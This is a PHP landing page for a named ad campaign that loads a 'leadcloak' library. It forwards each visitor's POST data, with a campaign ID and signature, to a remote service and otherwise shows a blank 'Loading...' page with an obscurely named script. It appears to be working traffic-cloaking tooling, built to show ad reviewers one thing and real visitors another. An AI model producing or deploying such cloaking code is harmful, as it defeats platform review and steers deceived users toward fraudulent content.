<?php
/**
 * Campaign: GeorgeLYoung444
 * Created: 2022-02-22 17:15:04 UTC
 */

require 'leadcloak-16rmetxt2cl0.php';

// ---------------------------------------------------
// Configuration

// Set this to false if application is properly installed.
$enableDebugging = true;

// Set this to false if you won't want to log error messages
$enableLogging = true;

if ($enableDebugging) {
	isApplicationReadyToRun();
}

if (isPost())
{
	$data = httpRequestMakePayload($campaignId, $campaignSignature, $_POST);

	$response = httpRequestExec($data);

	httpHandleResponse($response, $enableLogging);

	exit();
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title></title>
    <style type="text/css">
        body {
            display: table;
            position: absolute;
            height: 100%;
            width: 100%;
            margin:0 0 0 0;
            left: 0;

        }

        #cba85ed0c04 {
            display: table-cell;
            vertical-align: top;
        }

        .box {
            width: 100%;
            padding: 0;
            margin: 0 auto;
            text-align: left;
        }

        #textone {
            background: #fff;
            font-family: Times New Roman, Times, serif;
            font-size: 38px;
        }
    </style>
    <script type="text/javascript" src="16rmetxt2cl0.js"></script>
</head>
<body>

<div id="cba85ed0c04">
    <div class="box" id="textone">
        
        <p class="content">Loading...</p>
    </div>
</div>

</body>
</html>